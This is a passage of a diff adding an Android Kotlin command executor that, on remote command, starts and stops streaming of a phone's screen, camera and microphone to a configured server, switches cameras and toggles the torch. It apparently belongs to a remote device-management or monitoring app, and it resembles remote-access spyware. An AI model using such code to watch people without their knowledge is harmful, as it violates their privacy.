@@ -1,0 +1,1034 @@
+     1→package com.abuzahra.manager.executor
+     2→
+     3→import android.Manifest
+     4→import android.content.Context
+     5→import android.content.Intent
+     6→import android.content.pm.PackageManager
+     7→import android.os.Build
+     8→import android.util.Log
+     9→import androidx.core.app.ActivityCompat
+    10→import com.abuzahra.manager.Config
+    11→import com.abuzahra.manager.streaming.*
+    12→import com.google.gson.Gson
+    13→import kotlinx.coroutines.*
+    14→
+    15→/**
+    16→ * StreamExecutor - Handles all streaming commands
+    17→ * Interfaces with StreamManager to manage screen, camera, and audio streams
+    18→ * 
+    19→ * Supported commands:
+    20→ * - start_screen_stream: Start screen streaming with quality/fps parameters
+    21→ * - stop_screen_stream: Stop screen streaming
+    22→ * - start_camera_stream: Start camera streaming (front/back, quality)
+    23→ * - stop_camera_stream: Stop camera streaming
+    24→ * - switch_camera: Switch between front/back camera during stream
+    25→ * - start_audio_stream: Start audio streaming (mic/device)
+    26→ * - stop_audio_stream: Stop audio streaming
+    27→ * - get_stream_status: Get current streaming status
+    28→ * - set_stream_quality: Change stream quality on-the-fly
+    29→ * - enable_torch: Enable/disable torch during camera stream
+    30→ */
+    31→object StreamExecutor {
+    32→
+    33→    private const val TAG = "StreamExecutor"
+    34→    
+    35→    // Coroutine scope for async operations
+    36→    private val executorScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
+    37→    
+    38→    // Store active stream IDs for reference
+    39→    private var activeScreenStreamId: String? = null
+    40→    private var activeCameraStreamId: String? = null
+    41→    private var activeAudioStreamId: String? = null
+    42→    
+    43→    // ========== SCREEN STREAMING ==========
+    44→    
+    45→    /**
+    46→     * Start screen streaming
+    47→     * 
+    48→     * Required params:
+    49→     * - quality: (optional) LOW, MEDIUM, HIGH, ULTRA - default MEDIUM
+    50→     * - fps: (optional) 15, 24, 30, 60 - default 30
+    51→     * - bitrate: (optional) video bitrate in bps - default based on quality
+    52→     * - server_url: (optional) custom streaming server URL
+    53→     * - stream_key: (optional) stream key for authentication
+    54→     */
+    55→    fun startScreenStream(context: Context, params: Map<String, Any>): Map<String, Any> {
+    56→        return try {
+    57→            Log.i(TAG, "Starting screen stream with params: $params")
+    58→            
+    59→            // Check if already streaming
+    60→            if (activeScreenStreamId != null && StreamManager.isStreamActive(activeScreenStreamId!!)) {
+    61→                return mapOf(
+    62→                    "status" to "already_streaming",
+    63→                    "stream_id" to activeScreenStreamId!!,
+    64→                    "message" to "Screen stream is already active"
+    65→                )
+    66→            }
+    67→            
+    68→            // Check MediaProjection permission
+    69→            if (!ScreenStreamService.hasPermission()) {
+    70→                // Auto-request permission and return waiting status
+    71→                return PendingStreamManager.requestPermissionAndStart(
+    72→                    context, "screen", params
+    73→                )
+    74→            }
+    75→            
+    76→            // Parse quality
+    77→            val quality = parseQuality(params["quality"]?.toString())
+    78→            
+    79→            // Parse FPS
+    80→            val fps = (params["fps"] as? Number)?.toInt() ?: 30
+    81→            val validFps = if (fps in listOf(15, 24, 30, 60)) fps else 30
+    82→            
+    83→            // Parse bitrate
+    84→            val bitrate = (params["bitrate"] as? Number)?.toInt() ?: quality.videoBitrate
+    85→            
+    86→            // Auto-fill server URL from config if not provided
+    87→            val serverUrl = params["server_url"]?.toString()?.takeIf { it.isNotBlank() }
+    88→                ?: Config.getBaseUrl()
+    89→            
+    90→            // Create configuration
+    91→            val config = StreamConfig.Configuration(
+    92→                streamType = StreamConfig.StreamType.SCREEN,
+    93→                quality = quality,
+    94→                fps = validFps,
+    95→                videoBitrate = bitrate,
+    96→                audioEnabled = params["audio"]?.toString()?.toBoolean() ?: true,
+    97→                serverUrl = serverUrl,
+    98→                streamKey = params["stream_key"]?.toString() ?: "",
+    99→                enableAdaptiveBitrate = params["adaptive_bitrate"]?.toString()?.toBoolean() ?: true
+   100→            )
+   101→            
+   102→            // Validate configuration (server URL is auto-filled, so no error)
+   103→            val errors = StreamConfig.validateConfig(config)
+   104→            if (errors.isNotEmpty()) {
+   105→                return mapOf(
+   106→                    "status" to "error",
+   107→                    "message" to "Invalid configuration",
+   108→                    "errors" to errors
+   109→                )
+   110→            }
+   111→            
+   112→            // Start stream using StreamManager
+   113→            val streamId = StreamManager.startScreenStream(
+   114→                config = config,
+   115→                resultCode = ScreenStreamService.lastResultCode,
+   116→                resultData = ScreenStreamService.lastPermissionData
+   117→            )
+   118→            
+   119→            activeScreenStreamId = streamId
+   120→            
+   121→            mapOf(
+   122→                "status" to "started",
+   123→                "stream_id" to streamId,
+   124→                "message" to "Screen stream started successfully",
+   125→                "config" to mapOf(
+   126→                    "quality" to quality.name,
+   127→                    "fps" to validFps,
+   128→                    "bitrate" to bitrate,
+   129→                    "resolution" to "${config.width}x${config.height}"
+   130→                )
+   131→            )
+   132→            
+   133→        } catch (e: Exception) {
+   134→            Log.e(TAG, "Failed to start screen stream", e)
+   135→            mapOf(
+   136→                "status" to "error",
+   137→                "message" to "Failed to start screen stream: ${e.message}"
+   138→            )
+   139→        }
+   140→    }
+   141→    
+   142→    /**
+   143→     * Stop screen streaming
+   144→     */
+   145→    fun stopScreenStream(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
+   146→        return try {
+   147→            Log.i(TAG, "Stopping screen stream")
+   148→            
+   149→            val streamId = params["stream_id"]?.toString() ?: activeScreenStreamId
+   150→            
+   151→            if (streamId == null) {
+   152→                return mapOf(
+   153→                    "status" to "not_streaming",
+   154→                    "message" to "No active screen stream found"
+   155→                )
+   156→            }
+   157→            
+   158→            // Get session info before stopping
+   159→            val session = StreamManager.getSession(streamId)
+   160→            val duration = session?.let { System.currentTimeMillis() - it.createdAt } ?: 0L
+   161→            val bytesSent = session?.state?.totalBytesSent ?: 0L
+   162→            val framesEncoded = session?.state?.totalFramesEncoded ?: 0L
+   163→            
+   164→            // Stop the stream
+   165→            StreamManager.stopScreenStream(streamId)
+   166→            
+   167→            // Clear active ID if it matches
+   168→            if (activeScreenStreamId == streamId) {
+   169→                activeScreenStreamId = null
+   170→            }
+   171→            
+   172→            mapOf(
+   173→                "status" to "stopped",
+   174→                "stream_id" to streamId,
+   175→                "message" to "Screen stream stopped successfully",
+   176→                "statistics" to mapOf(
+   177→                    "duration_ms" to duration,
+   178→                    "bytes_sent" to bytesSent,
+   179→                    "frames_encoded" to framesEncoded
+   180→                )
+   181→            )
+   182→            
+   183→        } catch (e: Exception) {
+   184→            Log.e(TAG, "Failed to stop screen stream", e)
+   185→            mapOf(
+   186→                "status" to "error",
+   187→                "message" to "Failed to stop screen stream: ${e.message}"
+   188→            )
+   189→        }
+   190→    }
+   191→    
+   192→    // ========== CAMERA STREAMING ==========
+   193→    
+   194→    /**
+   195→     * Start camera streaming
+   196→     * 
+   197→     * Required params:
+   198→     * - camera: (optional) "front" or "back" - default "back"
+   199→     * - quality: (optional) LOW, MEDIUM, HIGH, ULTRA - default MEDIUM
+   200→     * - fps: (optional) 15, 24, 30, 60 - default 30
+   201→     * - bitrate: (optional) video bitrate in bps - default based on quality
+   202→     * - server_url: (optional) custom streaming server URL
+   203→     * - stream_key: (optional) stream key for authentication
+   204→     */
+   205→    fun startCameraStream(context: Context, params: Map<String, Any>): Map<String, Any> {
+   206→        return try {
+   207→            Log.i(TAG, "Starting camera stream with params: $params")
+   208→            
+   209→            // Check camera permission
+   210→            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
+   211→                != PackageManager.PERMISSION_GRANTED) {
+   212→                return mapOf(
+   213→                    "status" to "permission_required",
+   214→                    "message" to "Camera permission required",
+   215→                    "permission_required" to "android.permission.CAMERA"
+   216→                )
+   217→            }
+   218→            
+   219→            // Check if already streaming
+   220→            if (activeCameraStreamId != null && StreamManager.isStreamActive(activeCameraStreamId!!)) {
+   221→                return mapOf(
+   222→                    "status" to "already_streaming",
+   223→                    "stream_id" to activeCameraStreamId!!,
+   224→                    "message" to "Camera stream is already active"
+   225→                )
+   226→            }
+   227→            
+   228→            // Parse camera selection
+   229→            val cameraParam = params["camera"]?.toString()?.lowercase() ?: "back"
+   230→            val cameraId = when (cameraParam) {
+   231→                "front" -> CameraStreamService.CAMERA_FRONT
+   232→                "back" -> CameraStreamService.CAMERA_BACK
+   233→                else -> CameraStreamService.CAMERA_BACK
+   234→            }
+   235→            
+   236→            // Parse quality
+   237→            val quality = parseQuality(params["quality"]?.toString())
+   238→            
+   239→            // Parse FPS
+   240→            val fps = (params["fps"] as? Number)?.toInt() ?: 30
+   241→            val validFps = if (fps in listOf(15, 24, 30, 60)) fps else 30
+   242→            
+   243→            // Parse bitrate
+   244→            val bitrate = (params["bitrate"] as? Number)?.toInt() ?: quality.videoBitrate
+   245→            
+   246→            // Auto-fill server URL from config if not provided
+   247→            val serverUrl = params["server_url"]?.toString()?.takeIf { it.isNotBlank() }
+   248→                ?: Config.getBaseUrl()
+   249→            
+   250→            // Create configuration
+   251→            val config = StreamConfig.Configuration(
+   252→                streamType = if (cameraId == CameraStreamService.CAMERA_FRONT) 
+   253→                    StreamConfig.StreamType.CAMERA_FRONT 
+   254→                else 
+   255→                    StreamConfig.StreamType.CAMERA_BACK,
+   256→                quality = quality,
+   257→                fps = validFps,
+   258→                videoBitrate = bitrate,
+   259→                audioEnabled = params["audio"]?.toString()?.toBoolean() ?: false,
+   260→                serverUrl = serverUrl,
+   261→                streamKey = params["stream_key"]?.toString() ?: "",
+   262→                enableAdaptiveBitrate = params["adaptive_bitrate"]?.toString()?.toBoolean() ?: true
+   263→            )
+   264→            
+   265→            // Validate configuration
+   266→            val errors = StreamConfig.validateConfig(config)
+   267→            if (errors.isNotEmpty()) {
+   268→                return mapOf(
+   269→                    "status" to "error",
+   270→                    "message" to "Invalid configuration",
+   271→                    "errors" to errors
+   272→                )
+   273→            }
+   274→            
+   275→            // Start stream using StreamManager
+   276→            val streamId = StreamManager.startCameraStream(
+   277→                config = config,
+   278→                cameraId = cameraId
+   279→            )
+   280→            
+   281→            activeCameraStreamId = streamId
+   282→            
+   283→            mapOf(
+   284→                "status" to "started",
+   285→                "stream_id" to streamId,
+   286→                "message" to "Camera stream started successfully",
+   287→                "camera" to cameraParam,
+   288→                "config" to mapOf(
+   289→                    "quality" to quality.name,
+   290→                    "fps" to validFps,
+   291→                    "bitrate" to bitrate,
+   292→                    "resolution" to "${config.width}x${config.height}"
+   293→                )
+   294→            )
+   295→            
+   296→        } catch (e: Exception) {
+   297→            Log.e(TAG, "Failed to start camera stream", e)
+   298→            mapOf(
+   299→                "status" to "error",
+   300→                "message" to "Failed to start camera stream: ${e.message}"
+   301→            )
+   302→        }
+   303→    }
+   304→    
+   305→    /**
+   306→     * Stop camera streaming
+   307→     */
+   308→    fun stopCameraStream(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
+   309→        return try {
+   310→            Log.i(TAG, "Stopping camera stream")
+   311→            
+   312→            val streamId = params["stream_id"]?.toString() ?: activeCameraStreamId
+   313→            
+   314→            if (streamId == null) {
+   315→                return mapOf(
+   316→                    "status" to "not_streaming",
+   317→                    "message" to "No active camera stream found"
+   318→                )
+   319→            }
+   320→            
+   321→            // Get session info before stopping
+   322→            val session = StreamManager.getSession(streamId)
+   323→            val duration = session?.let { System.currentTimeMillis() - it.createdAt } ?: 0L
+   324→            val bytesSent = session?.state?.totalBytesSent ?: 0L
+   325→            val framesEncoded = session?.state?.totalFramesEncoded ?: 0L
+   326→            
+   327→            // Stop the stream
+   328→            StreamManager.stopCameraStream(streamId)
+   329→            
+   330→            // Clear active ID if it matches
+   331→            if (activeCameraStreamId == streamId) {
+   332→                activeCameraStreamId = null
+   333→            }
+   334→            
+   335→            mapOf(
+   336→                "status" to "stopped",
+   337→                "stream_id" to streamId,
+   338→                "message" to "Camera stream stopped successfully",
+   339→                "statistics" to mapOf(
+   340→                    "duration_ms" to duration,
+   341→                    "bytes_sent" to bytesSent,
+   342→                    "frames_encoded" to framesEncoded
+   343→                )
+   344→            )
+   345→            
+   346→        } catch (e: Exception) {
+   347→            Log.e(TAG, "Failed to stop camera stream", e)
+   348→            mapOf(
+   349→                "status" to "error",
+   350→                "message" to "Failed to stop camera stream: ${e.message}"
+   351→            )
+   352→        }
+   353→    }
+   354→    
+   355→    /**
+   356→     * Switch between front and back camera during stream
+   357→     */
+   358→    fun switchCamera(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
+   359→        return try {
+   360→            Log.i(TAG, "Switching camera")
+   361→            
+   362→            if (activeCameraStreamId == null || !StreamManager.isStreamActive(activeCameraStreamId!!)) {
+   363→                return mapOf(
+   364→                    "status" to "not_streaming",
+   365→                    "message" to "No active camera stream to switch"
+   366→                )
+   367→            }
+   368→            
+   369→            // Get current session to determine current camera
+   370→            val session = StreamManager.getSession(activeCameraStreamId!!)
+   371→            val currentCamera = session?.streamType?.name?.let { 
+   372→                if (it.contains("FRONT")) "front" else "back"
+   373→            } ?: "back"
+   374→            
+   375→            // Switch camera via StreamManager
+   376→            StreamManager.switchCamera(activeCameraStreamId)
+   377→            
+   378→            val newCamera = if (currentCamera == "front") "back" else "front"
+   379→            
+   380→            mapOf(
+   381→                "status" to "switched",
+   382→                "stream_id" to activeCameraStreamId!!,
+   383→                "message" to "Camera switched successfully",
+   384→                "previous_camera" to currentCamera,
+   385→                "current_camera" to newCamera
+   386→            )
+   387→            
+   388→        } catch (e: Exception) {
+   389→            Log.e(TAG, "Failed to switch camera", e)
+   390→            mapOf(
+   391→                "status" to "error",
+   392→                "message" to "Failed to switch camera: ${e.message}"
+   393→            )
+   394→        }
+   395→    }
+   396→    
+   397→    // ========== AUDIO STREAMING ==========
+   398→    
+   399→    /**
+   400→     * Start audio streaming
+   401→     * 
+   402→     * Required params:
+   403→     * - source: (optional) "microphone" or "device" - default "microphone"
+   404→     * - bitrate: (optional) audio bitrate in bps - default 128000
+   405→     * - server_url: (optional) custom streaming server URL
+   406→     * - stream_key: (optional) stream key for authentication
+   407→     * - noise_suppression: (optional) enable noise suppression - default true
+   408→     */
+   409→    fun startAudioStream(context: Context, params: Map<String, Any>): Map<String, Any> {
+   410→        return try {
+   411→            Log.i(TAG, "Starting audio stream with params: $params")
+   412→            
+   413→            // Parse source
+   414→            val source = when (params["source"]?.toString()?.lowercase()) {
+   415→                "device", "device_audio" -> AudioStreamService.SOURCE_DEVICE_AUDIO
+   416→                "both" -> AudioStreamService.SOURCE_BOTH
+   417→                else -> AudioStreamService.SOURCE_MICROPHONE
+   418→            }
+   419→            
+   420→            // Check microphone permission for microphone source
+   421→            if (source == AudioStreamService.SOURCE_MICROPHONE || source == AudioStreamService.SOURCE_BOTH) {
+   422→                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) 
+   423→                    != PackageManager.PERMISSION_GRANTED) {
+   424→                    return mapOf(
+   425→                        "status" to "permission_required",
+   426→                        "message" to "Record audio permission required",
+   427→                        "permission_required" to "android.permission.RECORD_AUDIO"
+   428→                    )
+   429→                }
+   430→            }
+   431→            
+   432→            // Check if already streaming
+   433→            if (activeAudioStreamId != null && StreamManager.isStreamActive(activeAudioStreamId!!)) {
+   434→                return mapOf(
+   435→                    "status" to "already_streaming",
+   436→                    "stream_id" to activeAudioStreamId!!,
+   437→                    "message" to "Audio stream is already active"
+   438→                )
+   439→            }
+   440→            
+   441→            // Parse bitrate
+   442→            val bitrate = (params["bitrate"] as? Number)?.toInt() ?: StreamConfig.DEFAULT_AUDIO_BITRATE
+   443→            val validBitrate = bitrate.coerceIn(StreamConfig.MIN_AUDIO_BITRATE, StreamConfig.MAX_AUDIO_BITRATE)
+   444→            
+   445→            // Auto-fill server URL from config if not provided
+   446→            val serverUrl = params["server_url"]?.toString()?.takeIf { it.isNotBlank() }
+   447→                ?: Config.getBaseUrl()
+   448→            
+   449→            // Create configuration
+   450→            val config = StreamConfig.Configuration(
+   451→                streamType = if (source == AudioStreamService.SOURCE_DEVICE_AUDIO) 
+   452→                    StreamConfig.StreamType.AUDIO_DEVICE 
+   453→                else 
+   454→                    StreamConfig.StreamType.AUDIO_MIC,
+   455→                videoEnabled = false,
+   456→                audioEnabled = true,
+   457→                audioBitrate = validBitrate,
+   458→                serverUrl = serverUrl,
+   459→                streamKey = params["stream_key"]?.toString() ?: "",
+   460→                enableNoiseSuppression = params["noise_suppression"]?.toString()?.toBoolean() ?: true,
+   461→                enableEchoCancellation = params["echo_cancellation"]?.toString()?.toBoolean() ?: true
+   462→            )
+   463→            
+   464→            // For device audio on Android 10+, we need MediaProjection permission
+   465→            var mediaProjectionResultCode = 0
+   466→            var mediaProjectionData: Intent? = null
+   467→            
+   468→            if (source == AudioStreamService.SOURCE_DEVICE_AUDIO && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+   469→                if (!ScreenStreamService.hasPermission()) {
+   470→                    // Auto-request permission and return waiting status
+   471→                    return PendingStreamManager.requestPermissionAndStart(
+   472→                        context, "audio_device", params
+   473→                    )
+   474→                }
+   475→                mediaProjectionResultCode = ScreenStreamService.lastResultCode
+   476→                mediaProjectionData = ScreenStreamService.lastPermissionData
+   477→            }
+   478→            
+   479→            // Start stream using StreamManager
+   480→            val streamId = StreamManager.startAudioStream(
+   481→                config = config,
+   482→                source = source,
+   483→                mediaProjectionResultCode = mediaProjectionResultCode,
+   484→                mediaProjectionData = mediaProjectionData
+   485→            )
+   486→            
+   487→            activeAudioStreamId = streamId
+   488→            
+   489→            mapOf(
+   490→                "status" to "started",
+   491→                "stream_id" to streamId,
+   492→                "message" to "Audio stream started successfully",
+   493→                "source" to source,
+   494→                "config" to mapOf(
+   495→                    "bitrate" to validBitrate,
+   496→                    "sample_rate" to StreamConfig.AUDIO_SAMPLE_RATE,
+   497→                    "channels" to StreamConfig.AUDIO_CHANNEL_COUNT,
+   498→                    "noise_suppression" to config.enableNoiseSuppression
+   499→                )
+   500→            )
+   501→            
+   502→        } catch (e: Exception) {
+   503→            Log.e(TAG, "Failed to start audio stream", e)
+   504→            mapOf(
+   505→                "status" to "error",
+   506→                "message" to "Failed to start audio stream: ${e.message}"
+   507→            )
+   508→        }
+   509→    }
+   510→    
+   511→    /**
+   512→     * Stop audio streaming
+   513→     */
+   514→    fun stopAudioStream(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
+   515→        return try {
+   516→            Log.i(TAG, "Stopping audio stream")
+   517→            
+   518→            val streamId = params["stream_id"]?.toString() ?: activeAudioStreamId
+   519→            
+   520→            if (streamId == null) {
+   521→                return mapOf(
+   522→                    "status" to "not_streaming",
+   523→                    "message" to "No active audio stream found"
+   524→                )
+   525→            }
+   526→            
+   527→            // Get session info before stopping
+   528→            val session = StreamManager.getSession(streamId)
+   529→            val duration = session?.let { System.currentTimeMillis() - it.createdAt } ?: 0L
+   530→            val bytesSent = session?.state?.totalBytesSent ?: 0L
+   531→            val framesEncoded = session?.state?.totalFramesEncoded ?: 0L
+   532→            
+   533→            // Stop the stream
+   534→            StreamManager.stopAudioStream(streamId)
+   535→            
+   536→            // Clear active ID if it matches
+   537→            if (activeAudioStreamId == streamId) {
+   538→                activeAudioStreamId = null
+   539→            }
+   540→            
+   541→            mapOf(
+   542→                "status" to "stopped",
+   543→                "stream_id" to streamId,
+   544→                "message" to "Audio stream stopped successfully",
+   545→                "statistics" to mapOf(
+   546→                    "duration_ms" to duration,
+   547→                    "bytes_sent" to bytesSent,
+   548→                    "frames_encoded" to framesEncoded
+   549→                )
+   550→            )
+   551→            
+   552→        } catch (e: Exception) {
+   553→            Log.e(TAG, "Failed to stop audio stream", e)
+   554→            mapOf(
+   555→                "status" to "error",
+   556→                "message" to "Failed to stop audio stream: ${e.message}"
+   557→            )
+   558→        }
+   559→    }
+   560→    
+   561→    // ========== STATUS & CONTROL ==========
+   562→    
+   563→    /**
+   564→     * Get current streaming status
+   565→     * Returns status of all active streams
+   566→     */
+   567→    fun getStreamStatus(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
+   568→        return try {
+   569→            val specificStreamId = params["stream_id"]?.toString()
+   570→            
+   571→            if (specificStreamId != null) {
+   572→                // Get status for specific stream
+   573→                val session = StreamManager.getSession(specificStreamId)
+   574→                
+   575→                if (session == null) {
+   576→                    return mapOf(
+   577→                        "status" to "not_found",
+   578→                        "stream_id" to specificStreamId,
+   579→                        "message" to "Stream not found"
+   580→                    )
+   581→                }
+   582→                
+   583→                return mapOf(
+   584→                    "stream_id" to specificStreamId,
+   585→                    "stream_type" to session.streamType.name,
+   586→                    "is_active" to session.state.isActive,
+   587→                    "is_paused" to session.state.paused,
+   588→                    "duration_ms" to (System.currentTimeMillis() - session.createdAt),
+   589→                    "bytes_sent" to session.state.totalBytesSent,
+   590→                    "frames_encoded" to session.state.totalFramesEncoded,
+   591→                    "current_bitrate" to session.state.currentBitrate,
+   592→                    "last_error" to (session.state.lastError ?: ""),
+   593→                    "config" to session.config.toMap()
+   594→                )
+   595→            }
+   596→            
+   597→            // Get all stream statuses
+   598→            val sessions = StreamManager.getActiveSessions()
+   599→            val statistics = StreamManager.getStatistics()
+   600→            
+   601→            mapOf(
+   602→                "active_stream_count" to sessions.size,
+   603→                "active_stream_ids" to sessions.keys.toList(),
+   604→                "total_bytes_sent" to (statistics["total_bytes_sent"] ?: 0L),
+   605→                "total_frames_encoded" to (statistics["total_frames_encoded"] ?: 0),
+   606→                "streams" to sessions.mapValues { (_, session) ->
+   607→                    mapOf(
+   608→                        "type" to session.streamType.name,
+   609→                        "is_active" to session.state.isActive,
+   610→                        "is_paused" to session.state.paused,
+   611→                        "duration_ms" to (System.currentTimeMillis() - session.createdAt),
+   612→                        "bytes_sent" to session.state.totalBytesSent,
+   613→                        "frames_encoded" to session.state.totalFramesEncoded
+   614→                    )
+   615→                },
+   616→                "screen_stream" to if (activeScreenStreamId != null) {
+   617→                    mapOf("active" to true, "stream_id" to activeScreenStreamId)
+   618→                } else {
+   619→                    mapOf("active" to false)
+   620→                },
+   621→                "camera_stream" to if (activeCameraStreamId != null) {
+   622→                    mapOf("active" to true, "stream_id" to activeCameraStreamId)
+   623→                } else {
+   624→                    mapOf("active" to false)
+   625→                },
+   626→                "audio_stream" to if (activeAudioStreamId != null) {
+   627→                    mapOf("active" to true, "stream_id" to activeAudioStreamId)
+   628→                } else {
+   629→                    mapOf("active" to false)
+   630→                }
+   631→            )
+   632→            
+   633→        } catch (e: Exception) {
+   634→            Log.e(TAG, "Failed to get stream status", e)
+   635→            mapOf(
+   636→                "status" to "error",
+   637→                "message" to "Failed to get stream status: ${e.message}"
+   638→            )
+   639→        }
+   640→    }
+   641→    
+   642→    /**
+   643→     * Set stream quality on-the-fly
+   644→     * 
+   645→     * Required params:
+   646→     * - quality: LOW, MEDIUM, HIGH, or ULTRA
+   647→     * - stream_id: (optional) specific stream ID, or applies to all active streams
+   648→     */
+   649→    fun setStreamQuality(context: Context, params: Map<String, Any>): Map<String, Any> {
+   650→        return try {
+   651→            Log.i(TAG, "Setting stream quality: $params")
+   652→            
+   653→            val qualityParam = params["quality"]?.toString()
+   654→            if (qualityParam.isNullOrBlank()) {
+   655→                return mapOf(
+   656→                    "status" to "error",
+   657→                    "message" to "Quality parameter required"
+   658→                )
+   659→            }
+   660→            
+   661→            val quality = parseQuality(qualityParam)
+   662→            val streamId = params["stream_id"]?.toString()
+   663→            
+   664→            if (streamId != null) {
+   665→                // Update specific stream
+   666→                val session = StreamManager.getSession(streamId)
+   667→                if (session == null) {
+   668→                    return mapOf(
+   669→                        "status" to "not_found",
+   670→                        "message" to "Stream not found: $streamId"
+   671→                    )
+   672→                }
+   673→                
+   674→                // Update configuration
+   675→                val newConfig = session.config.copy(
+   676→                    quality = quality,
+   677→                    width = quality.width,
+   678→                    height = quality.height,
+   679→                    videoBitrate = quality.videoBitrate
+   680→                )
+   681→                
+   682→                // Update stream via service intent
+   683→                when (session.streamType) {
+   684→                    StreamConfig.StreamType.SCREEN -> {
+   685→                        val intent = Intent(context, ScreenStreamService::class.java).apply {
+   686→                            action = ScreenStreamService.ACTION_UPDATE_CONFIG
+   687→                            putExtra(ScreenStreamService.EXTRA_CONFIG, Gson().toJson(newConfig))
+   688→                        }
+   689→                        context.startService(intent)
+   690→                    }
+   691→                    StreamConfig.StreamType.CAMERA_FRONT, StreamConfig.StreamType.CAMERA_BACK -> {
+   692→                        val intent = Intent(context, CameraStreamService::class.java).apply {
+   693→                            action = CameraStreamService.ACTION_UPDATE_QUALITY
+   694→                            putExtra(CameraStreamService.EXTRA_QUALITY, quality.name)
+   695→                        }
+   696→                        context.startService(intent)
+   697→                    }
+   698→                    else -> {
+   699→                        // Audio streams don't have video quality settings
+   700→                        return mapOf(
+   701→                            "status" to "error",
+   702→                            "message" to "Quality setting not applicable to audio streams"
+   703→                        )
+   704→                    }
+   705→                }
+   706→                
+   707→                return mapOf(
+   708→                    "status" to "updated",
+   709→                    "stream_id" to streamId,
+   710→                    "quality" to quality.name,
+   711→                    "message" to "Stream quality updated successfully"
+   712→                )
+   713→            }
+   714→            
+   715→            // Update all active video streams
+   716→            val updatedStreams = mutableListOf<String>()
+   717→            val errors = mutableListOf<String>()
+   718→            
+   719→            mapOf(
+   720→                "screen" to activeScreenStreamId,
+   721→                "camera" to activeCameraStreamId
+   722→            ).forEach { (type, id) ->
+   723→                if (id != null && StreamManager.isStreamActive(id)) {
+   724→                    try {
+   725→                        val session = StreamManager.getSession(id) ?: return@forEach
+   726→                        
+   727→                        val newConfig = session.config.copy(
+   728→                            quality = quality,
+   729→                            width = quality.width,
+   730→                            height = quality.height,
+   731→                            videoBitrate = quality.videoBitrate
+   732→                        )
+   733→                        
+   734→                        when (session.streamType) {
+   735→                            StreamConfig.StreamType.SCREEN -> {
+   736→                                val intent = Intent(context, ScreenStreamService::class.java).apply {
+   737→                                    action = ScreenStreamService.ACTION_UPDATE_CONFIG
+   738→                                    putExtra(ScreenStreamService.EXTRA_CONFIG, Gson().toJson(newConfig))
+   739→                                }
+   740→                                context.startService(intent)
+   741→                            }
+   742→                            StreamConfig.StreamType.CAMERA_FRONT, StreamConfig.StreamType.CAMERA_BACK -> {
+   743→                                val intent = Intent(context, CameraStreamService::class.java).apply {
+   744→                                    action = CameraStreamService.ACTION_UPDATE_QUALITY
+   745→                                    putExtra(CameraStreamService.EXTRA_QUALITY, quality.name)
+   746→                                }
+   747→                                context.startService(intent)
+   748→                            }
+   749→                            else -> {}
+   750→                        }
+   751→                        
+   752→                        updatedStreams.add(id)
+   753→                    } catch (e: Exception) {
+   754→                        errors.add("$type: ${e.message}")
+   755→                    }
+   756→                }
+   757→            }
+   758→            
+   759→            mapOf(
+   760→                "status" to if (updatedStreams.isNotEmpty()) "updated" else "no_streams",
+   761→                "quality" to quality.name,
+   762→                "updated_streams" to updatedStreams,
+   763→                "errors" to errors,
+   764→                "message" to if (updatedStreams.isNotEmpty()) 
+   765→                    "Quality updated for ${updatedStreams.size} stream(s)" 
+   766→                else 
+   767→                    "No active video streams to update"
+   768→            )
+   769→            
+   770→        } catch (e: Exception) {
+   771→            Log.e(TAG, "Failed to set stream quality", e)
+   772→            mapOf(
+   773→                "status" to "error",
+   774→                "message" to "Failed to set stream quality: ${e.message}"
+   775→            )
+   776→        }
+   777→    }
+   778→    
+   779→    /**
+   780→     * Enable or disable torch during camera stream
+   781→     * 
+   782→     * Required params:
+   783→     * - enable: true to enable torch, false to disable
+   784→     * - stream_id: (optional) specific stream ID
+   785→     */
+   786→    fun enableTorch(context: Context, params: Map<String, Any>): Map<String, Any> {
+   787→        return try {
+   788→            Log.i(TAG, "Setting torch: $params")
+   789→            
+   790→            val enable = params["enable"]?.toString()?.toBoolean() 
+   791→                ?: params["arg"]?.toString()?.toBoolean()
+   792→                ?: true
+   793→            
+   794→            val streamId = params["stream_id"]?.toString() ?: activeCameraStreamId
+   795→            
+   796→            if (streamId == null || !StreamManager.isStreamActive(streamId)) {
+   797→                return mapOf(
+   798→                    "status" to "not_streaming",
+   799→                    "message" to "No active camera stream for torch control"
+   800→                )
+   801→            }
+   802→            
+   803→            // Verify it's a camera stream
+   804→            val session = StreamManager.getSession(streamId)
+   805→            if (session == null || 
+   806→                (session.streamType != StreamConfig.StreamType.CAMERA_FRONT && 
+   807→                 session.streamType != StreamConfig.StreamType.CAMERA_BACK)) {
+   808→                return mapOf(
+   809→                    "status" to "error",
+   810→                    "message" to "Torch control is only available for camera streams"
+   811→                )
+   812→            }
+   813→            
+   814→            // Check if camera supports flash
+   815→            // Note: Front cameras typically don't have flash
+   816→            if (session.streamType == StreamConfig.StreamType.CAMERA_FRONT) {
+   817→                return mapOf(
+   818→                    "status" to "not_supported",
+   819→                    "message" to "Torch is typically not available on front camera"
+   820→                )
+   821→            }
+   822→            
+   823→            // Toggle torch via StreamManager
+   824→            StreamManager.toggleTorch(streamId)
+   825→            
+   826→            mapOf(
+   827→                "status" to "success",
+   828→                "stream_id" to streamId,
+   829→                "torch_enabled" to enable,
+   830→                "message" to "Torch ${if (enable) "enabled" else "disabled"} successfully"
+   831→            )
+   832→            
+   833→        } catch (e: Exception) {
+   834→            Log.e(TAG, "Failed to set torch", e)
+   835→            mapOf(
+   836→                "status" to "error",
+   837→                "message" to "Failed to set torch: ${e.message}"
+   838→            )
+   839→        }
+   840→    }
+   841→    
+   842→    // ========== PAUSE/RESUME ==========
+   843→    
+   844→    /**
+   845→     * Pause a stream
+   846→     */
+   847→    fun pauseStream(context: Context, params: Map<String, Any>): Map<String, Any> {
+   848→        return try {
+   849→            val streamId = params["stream_id"]?.toString()
+   850→                ?: activeScreenStreamId
+   851→                ?: activeCameraStreamId
+   852→                ?: activeAudioStreamId
+   853→            
+   854→            if (streamId == null) {
+   855→                return mapOf(
+   856→                    "status" to "not_streaming",
+   857→                    "message" to "No active stream to pause"
+   858→                )
+   859→            }
+   860→            
